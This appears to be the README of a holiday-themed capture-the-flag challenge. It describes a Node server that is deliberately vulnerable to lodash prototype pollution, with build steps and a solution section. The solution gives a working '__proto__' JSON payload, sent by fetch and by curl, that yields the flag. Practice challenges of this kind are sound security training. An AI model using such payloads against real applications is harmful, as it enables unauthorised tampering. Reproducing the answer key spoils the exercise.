# Santa's Christmas Factory

A web server affected by JavaScript prototype pollution.

## Description

The poles are melting! Santa must stop the [pollution](https://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12#diff-36b7ba0ba252cc39fa5921d9484b7674c8bc7af119636ba7f46194ee871047b6) of his christmas factories or Santa's factories will go down!

Possible hints:
- Exposed package.json with vulnerable lodash version: http://xmas.rip:??/package.json
- Pollution fix in lodash: https://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12#diff-36b7ba0ba252cc39fa5921d9484b7674c8bc7af119636ba7f46194ee871047b6
- Prototype Pollution Talk: https://www.youtube.com/watch?v=LUsiFV3dsK8&ab_channel=NorthSec
- Description of the problem: https://snyk.io/vuln/SNYK-JS-LODASH-73638

## Build with Docker

```bash
docker-compose build
```

## Run with Docker

Add flag to the [``docker-compose.yml``](./docker-compose.yml).

```bash
docker-compose up --build
```

The web server is exposed on TCP port 26. You can change it in the ``docker-compose.yml`` file.

## Run without Docker

First install [node](https://nodejs.org/). Next you have to install the npm dependencies:

```bash
npm install
```

Start server:

```bash
node server.js answer flag
```

## Solution

In the browser:
```js
fetch('/stopPollution', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: '{"__proto__": {"success": true}}',
})
.then(response => response.text())
.then(data => {
    console.log(data);
});
```

Or with curl:
```bash
curl 'http://localhost:3000/stopPollution' \
  -H 'Content-Type: application/json' \
  --data-binary '{"__proto__": {"success": true}}'
```

The flag will be sent in the response.